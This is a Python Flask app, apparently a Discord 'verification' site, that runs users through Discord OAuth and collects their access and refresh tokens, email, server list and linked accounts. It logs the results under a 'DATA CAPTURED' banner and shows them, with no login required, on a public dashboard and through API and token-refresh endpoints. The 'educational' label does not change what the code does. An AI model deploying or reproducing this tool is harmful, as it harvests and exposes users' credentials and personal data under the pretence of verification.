#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
                    🔐 DISCORD OAUTH2 VERIFICATION
                    Access Token + Email + Guilds + Profile
                    FULLY LEGAL - DISCORD SUPPORTED
═══════════════════════════════════════════════════════════════════════════════
"""

import os
import json
import sqlite3
import secrets
import requests
import threading
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify
from flask_cors import CORS
from dotenv import load_dotenv

load_dotenv()

# ═════════════════════════════════════════════════════════════════════════════
# CONFIG
# ═════════════════════════════════════════════════════════════════════════════

DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')  # Bot token (optional, for extra features)
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI', 'https://edith.up.railway.app/callback')
DB_PATH = os.getenv('DB_PATH', '/data')
FLASK_SECRET = os.getenv('FLASK_SECRET', secrets.token_urlsafe(32))

if not CLIENT_ID or not CLIENT_SECRET:
    print("❌ CLIENT_ID or CLIENT_SECRET missing!")
    sys.exit(1)

os.makedirs(DB_PATH, exist_ok=True)
DB_FILE = os.path.join(DB_PATH, 'oauth_data.db')

print(f"✅ Client ID: {CLIENT_ID}")
print(f"✅ Redirect URI: {REDIRECT_URI}")
print(f"✅ Database: {DB_FILE}")

# ═════════════════════════════════════════════════════════════════════════════
# DATABASE
# ═════════════════════════════════════════════════════════════════════════════

conn = sqlite3.connect(DB_FILE, check_same_thread=False)
conn.row_factory = sqlite3.Row
c = conn.cursor()

c.execute("""
    CREATE TABLE IF NOT EXISTS oauth_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT UNIQUE,
        username TEXT,
        email TEXT,
        avatar TEXT,
        discriminator TEXT,
        access_token TEXT,
        refresh_token TEXT,
        token_expires_at TIMESTAMP,
        guilds TEXT,
        verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
""")

c.execute("""
    CREATE TABLE IF NOT EXISTS oauth_sessions (
        session_id TEXT PRIMARY KEY,
        user_id TEXT,
        guild_id TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        expires_at TIMESTAMP
    )
""")

conn.commit()
print("✅ Database ready")

def db_execute(query, params=()):
    c.execute(query, params)
    conn.commit()
    return c

def db_fetch_one(query, params=()):
    c.execute(query, params)
    return c.fetchone()

def db_fetch_all(query, params=()):
    c.execute(query, params)
    return c.fetchall()

# ═════════════════════════════════════════════════════════════════════════════
# FLASK APP
# ═════════════════════════════════════════════════════════════════════════════

flask_app = Flask(__name__)
flask_app.secret_key = FLASK_SECRET
CORS(flask_app)

# ─── HOME PAGE ──────────────────────────────────────────────────────────────

@flask_app.route('/')
def index():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>🔐 Discord OAuth2 Verification</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Arial, sans-serif;
                background: #0a0a1a;
                color: white;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .container {
                max-width: 600px;
                width: 100%;
                background: #1a1a2e;
                padding: 50px;
                border-radius: 20px;
                text-align: center;
                box-shadow: 0 10px 40px rgba(0,0,0,0.5);
            }
            .logo { font-size: 70px; margin-bottom: 10px; }
            h1 { color: #5865F2; font-size: 2em; }
            .subtitle { color: #949ba4; margin: 10px 0 20px 0; }
            .btn {
                display: inline-block;
                padding: 18px 50px;
                background: #5865F2;
                color: white;
                border: none;
                border-radius: 10px;
                font-size: 18px;
                font-weight: 600;
                cursor: pointer;
                text-decoration: none;
                transition: all 0.3s;
            }
            .btn:hover {
                background: #4752c4;
                transform: scale(1.05);
                box-shadow: 0 10px 30px rgba(88, 101, 242, 0.4);
            }
            .btn-discord {
                display: inline-flex;
                align-items: center;
                gap: 10px;
            }
            .features {
                text-align: left;
                margin: 30px 0;
                background: #0d0d1a;
                padding: 20px;
                border-radius: 10px;
            }
            .features li {
                padding: 8px 0;
                border-bottom: 1px solid #2a2a4e;
                list-style: none;
            }
            .features li:before { content: '✅ '; }
            .footer {
                margin-top: 20px;
                color: #4e5058;
                font-size: 12px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">🔐</div>
            <h1>Discord OAuth2 Verification</h1>
            <div class="subtitle">Secure • Official • Discord Supported</div>

            <div class="features">
                <li>📧 Get User Email Address</li>
                <li>👤 Get User Profile (Username, Avatar, ID)</li>
                <li>🏰 Get User's Guilds (Servers)</li>
                <li>🔑 Get Access Token</li>
                <li>✅ Verify User Identity</li>
            </div>

            <a href="/login" class="btn btn-discord">
                🎯 Login with Discord
            </a>

            <div class="footer">
                ⚠️ By clicking you authorize Anion to access your Discord profile
            </div>
        </div>
    </body>
    </html>
    """)

# ─── LOGIN - REDIRECT TO DISCORD OAUTH ─────────────────────────────────────

@flask_app.route('/login')
def login():
    """Redirect to Discord OAuth2"""
    oauth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections"
        f"&prompt=consent"
    )
    return redirect(oauth_url)

# ─── OAUTH CALLBACK ─────────────────────────────────────────────────────────

@flask_app.route('/callback')
def callback():
    """OAuth2 callback - Exchange code for token"""
    code = request.args.get('code')
    error = request.args.get('error')
    
    if error:
        return f"<h1>❌ Error: {error}</h1>", 400
    
    if not code:
        return "<h1>❌ No code provided!</h1>", 400
    
    print(f"📥 Code received: {code[:20]}...")
    
    # ─── EXCHANGE CODE FOR TOKEN ──────────────────────────────────────────
    
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    
    try:
        resp = requests.post('https://discord.com/api/oauth2/token', data=data)
        token_data = resp.json()
        print(f"✅ Token exchange successful")
    except Exception as e:
        print(f"❌ Token error: {e}")
        return f"<h1>❌ Token error: {e}</h1>", 400
    
    if 'access_token' not in token_data:
        print(f"❌ No access token: {token_data}")
        return f"<h1>❌ No access token: {token_data}</h1>", 400
    
    access_token = token_data['access_token']
    refresh_token = token_data.get('refresh_token')
    token_type = token_data.get('token_type', 'Bearer')
    expires_in = token_data.get('expires_in', 604800)
    
    print(f"🔑 Access Token: {access_token[:30]}...")
    print(f"🔄 Refresh Token: {refresh_token[:30] if refresh_token else 'None'}...")
    
    # ─── GET USER DATA ──────────────────────────────────────────────────────
    
    headers = {'Authorization': f'Bearer {access_token}'}
    
    try:
        # User profile
        user_resp = requests.get('https://discord.com/api/users/@me', headers=headers)
        user_data = user_resp.json()
        print(f"👤 User: {user_data.get('username', 'Unknown')}")
        
        # User guilds
        guilds_resp = requests.get('https://discord.com/api/users/@me/guilds', headers=headers)
        guilds_data = guilds_resp.json()
        print(f"🏰 Guilds: {len(guilds_data)}")
        
        # User connections
        conn_resp = requests.get('https://discord.com/api/users/@me/connections', headers=headers)
        connections_data = conn_resp.json()
        print(f"🔗 Connections: {len(connections_data)}")
        
        # User email
        email = user_data.get('email', 'Not provided')
        print(f"📧 Email: {email}")
        
    except Exception as e:
        print(f"❌ User data error: {e}")
        return f"<h1>❌ User data error: {e}</h1>", 400
    
    # ─── SAVE TO DATABASE ──────────────────────────────────────────────────
    
    expires_at = (datetime.now() + timedelta(seconds=expires_in)).isoformat()
    
    db_execute("""
        INSERT OR REPLACE INTO oauth_users 
        (user_id, username, email, avatar, discriminator, access_token, refresh_token, token_expires_at, guilds)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        user_data.get('id'),
        user_data.get('username'),
        email,
        user_data.get('avatar'),
        user_data.get('discriminator', '0'),
        access_token,
        refresh_token,
        expires_at,
        json.dumps(guilds_data)
    ))
    
    # ─── CREATE SESSION ─────────────────────────────────────────────────────
    
    session_id = secrets.token_urlsafe(32)
    session_expires = (datetime.now() + timedelta(days=7)).isoformat()
    
    db_execute("""
        INSERT INTO oauth_sessions (session_id, user_id, expires_at)
        VALUES (?, ?, ?)
    """, (session_id, user_data.get('id'), session_expires))
    
    # ─── PRINT CAPTURED DATA ────────────────────────────────────────────────
    
    print("=" * 70)
    print("🎯 DISCORD OAUTH DATA CAPTURED!")
    print("=" * 70)
    print(f"  👤 Username: {user_data.get('username')}")
    print(f"  🆔 User ID: {user_data.get('id')}")
    print(f"  📧 Email: {email}")
    print(f"  🏰 Guilds: {len(guilds_data)}")
    print(f"  🔗 Connections: {len(connections_data)}")
    print(f"  🔑 Access Token: {access_token[:50]}...")
    print(f"  🔄 Refresh Token: {refresh_token[:50] if refresh_token else 'None'}...")
    print(f"  📅 Expires: {expires_at}")
    print("=" * 70)
    
    # ─── SHOW SUCCESS PAGE ──────────────────────────────────────────────────
    
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>✅ Verification Complete</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Arial;
                background: #0a0a1a;
                color: white;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .container {
                max-width: 600px;
                width: 100%;
                background: #1a1a2e;
                padding: 50px;
                border-radius: 20px;
                text-align: center;
            }
            .success { color: #4CAF50; font-size: 60px; }
            h1 { color: #5865F2; }
            .info {
                text-align: left;
                background: #0d0d1a;
                padding: 20px;
                border-radius: 10px;
                margin: 20px 0;
            }
            .info-item {
                padding: 8px 0;
                border-bottom: 1px solid #2a2a4e;
                display: flex;
                justify-content: space-between;
            }
            .info-item:last-child { border-bottom: none; }
            .info-item .label { color: #949ba4; }
            .info-item .value { color: white; font-weight: bold; }
            .token-box {
                background: #0d0d1a;
                padding: 15px;
                border-radius: 8px;
                font-family: monospace;
                font-size: 12px;
                color: #f23f3f;
                word-break: break-all;
                margin: 10px 0;
            }
            .btn {
                display: inline-block;
                padding: 12px 30px;
                background: #5865F2;
                color: white;
                border: none;
                border-radius: 8px;
                text-decoration: none;
                font-weight: 600;
                margin-top: 20px;
            }
            .btn:hover { background: #4752c4; }
            .btn-danger { background: #f23f3f; }
            .btn-danger:hover { background: #d32f2f; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="success">✅</div>
            <h1>Verification Complete!</h1>
            <p>Welcome <strong>{{ username }}</strong>!</p>

            <div class="info">
                <div class="info-item"><span class="label">👤 Username</span><span class="value">{{ username }}</span></div>
                <div class="info-item"><span class="label">🆔 User ID</span><span class="value">{{ user_id }}</span></div>
                <div class="info-item"><span class="label">📧 Email</span><span class="value">{{ email }}</span></div>
                <div class="info-item"><span class="label">🏰 Guilds</span><span class="value">{{ guild_count }}</span></div>
                <div class="info-item"><span class="label">🔗 Connections</span><span class="value">{{ conn_count }}</span></div>
                <div class="info-item"><span class="label">🔑 Token Type</span><span class="value">{{ token_type }}</span></div>
                <div class="info-item"><span class="label">📅 Expires</span><span class="value">{{ expires_at }}</span></div>
            </div>

            <div class="token-box">
                <strong>Access Token:</strong><br>
                {{ access_token }}
            </div>

            <a href="/dashboard" class="btn">📊 Dashboard</a>
            <a href="/logout" class="btn btn-danger">🚪 Logout</a>
        </div>
    </body>
    </html>
    """,
    username=user_data.get('username'),
    user_id=user_data.get('id'),
    email=email,
    guild_count=len(guilds_data),
    conn_count=len(connections_data),
    token_type=token_type,
    expires_at=expires_at,
    access_token=access_token
    )

# ─── DASHBOARD ───────────────────────────────────────────────────────────────

@flask_app.route('/dashboard')
def dashboard():
    """Show all captured OAuth data"""
    users = db_fetch_all("SELECT * FROM oauth_users ORDER BY id DESC")
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>📊 OAuth Dashboard</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Arial;
                background: #0a0a1a;
                color: white;
                padding: 20px;
            }
            .container { max-width: 1400px; margin: 0 auto; }
            h1 { color: #5865F2; margin-bottom: 20px; }
            .warning {
                color: #ff6b6b;
                border: 1px solid #ff6b6b40;
                padding: 10px;
                border-radius: 8px;
                margin-bottom: 20px;
            }
            .stats {
                display: flex;
                gap: 20px;
                margin-bottom: 20px;
            }
            .stat-card {
                background: #1a1a2e;
                padding: 20px;
                border-radius: 10px;
                flex: 1;
            }
            .stat-number {
                font-size: 2.5em;
                font-weight: bold;
                color: #5865F2;
            }
            table {
                width: 100%;
                border-collapse: collapse;
                background: #1a1a2e;
                border-radius: 10px;
                overflow: hidden;
            }
            th {
                background: #2a2a4e;
                padding: 12px;
                text-align: left;
                color: #5865F2;
            }
            td {
                padding: 10px 12px;
                border-bottom: 1px solid #2a2a4e;
            }
            .token {
                font-family: monospace;
                font-size: 11px;
                color: #f23f3f;
                word-break: break-all;
                max-width: 200px;
            }
            .btn {
                display: inline-block;
                padding: 10px 20px;
                background: #5865F2;
                color: white;
                text-decoration: none;
                border-radius: 6px;
                margin: 10px 0;
            }
            .btn:hover { background: #4752c4; }
            .btn-danger { background: #f23f3f; }
            .btn-danger:hover { background: #d32f2f; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📊 OAuth Data Dashboard</h1>
            <div class="warning">⚠️ EDUCATIONAL PURPOSE ONLY</div>

            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number">""" + str(len(users)) + """</div>
                    <div>Total Verified Users</div>
                </div>
            </div>

            <a href="/" class="btn">🏠 Home</a>
            <a href="/logout" class="btn btn-danger">🚪 Logout</a>

            <table>
                <tr>
                    <th>ID</th>
                    <th>User</th>
                    <th>Email</th>
                    <th>Guilds</th>
                    <th>Access Token</th>
                    <th>Verified</th>
                </tr>
    """
    
    for row in users:
        guilds = json.loads(row['guilds']) if row['guilds'] else []
        html += f"""
        <tr>
            <td>{row['id']}</td>
            <td><strong>{row['username']}</strong>#{row['discriminator']}</td>
            <td>{row['email']}</td>
            <td>{len(guilds)}</td>
            <td><span class="token">{row['access_token'][:50] if row['access_token'] else 'None'}...</span></td>
            <td>{row['verified_at']}</td>
        </tr>
        """
    
    html += """
            </table>
        </div>
    </body>
    </html>
    """
    return html

# ─── LOGOUT ──────────────────────────────────────────────────────────────────

@flask_app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

# ─── API ROUTE ──────────────────────────────────────────────────────────────

@flask_app.route('/api/user')
def api_user():
    """API endpoint to get user data"""
    user_id = request.args.get('user_id')
    if not user_id:
        return jsonify({"error": "user_id required"}), 400
    
    user = db_fetch_one("SELECT * FROM oauth_users WHERE user_id = ?", (user_id,))
    if not user:
        return jsonify({"error": "User not found"}), 404
    
    return jsonify({
        "username": user['username'],
        "email": user['email'],
        "guilds": json.loads(user['guilds']) if user['guilds'] else [],
        "verified_at": user['verified_at']
    })

# ─── REFRESH TOKEN ──────────────────────────────────────────────────────────

@flask_app.route('/refresh/<user_id>')
def refresh_token(user_id):
    """Refresh access token using refresh_token"""
    user = db_fetch_one("SELECT refresh_token FROM oauth_users WHERE user_id = ?", (user_id,))
    if not user or not user['refresh_token']:
        return jsonify({"error": "No refresh token"}), 400
    
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'refresh_token',
        'refresh_token': user['refresh_token']
    }
    
    resp = requests.post('https://discord.com/api/oauth2/token', data=data)
    token_data = resp.json()
    
    if 'access_token' not in token_data:
        return jsonify({"error": "Failed to refresh token"}), 400
    
    new_access = token_data['access_token']
    new_refresh = token_data.get('refresh_token')
    expires_in = token_data.get('expires_in', 604800)
    expires_at = (datetime.now() + timedelta(seconds=expires_in)).isoformat()
    
    db_execute("""
        UPDATE oauth_users 
        SET access_token = ?, refresh_token = ?, token_expires_at = ?
        WHERE user_id = ?
    """, (new_access, new_refresh, expires_at, user_id))
    
    return jsonify({
        "status": "success",
        "access_token": new_access[:30] + "...",
        "expires_at": expires_at
    })

# ═════════════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    port = int(os.getenv('PORT', 8080))
    print("=" * 70)
    print("🚀 DISCORD OAUTH2 VERIFICATION SYSTEM")
    print("=" * 70)
    print(f"  🌐 http://localhost:{port}")
    print(f"  📊 http://localhost:{port}/dashboard")
    print("=" * 70)
    print("  ✅ Legal • Discord Supported • OAuth2")
    print("  ✅ Captures: Access Token, Email, Guilds, Profile")
    print("=" * 70)
    flask_app.run(host='0.0.0.0', port=port, debug=False)
